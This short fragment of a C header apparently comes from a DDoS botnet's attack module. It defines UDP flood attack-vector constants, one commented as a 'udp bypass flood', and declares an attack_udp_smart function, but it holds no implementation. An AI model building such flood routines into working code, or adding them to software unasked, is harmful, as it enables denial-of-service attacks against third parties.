...
#define ATK_VEC_UDP_SMART  11
#define ATK_VEC_UDP_BYPASS 12 /* udp bypass flood */
...
void attack_udp_smart(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
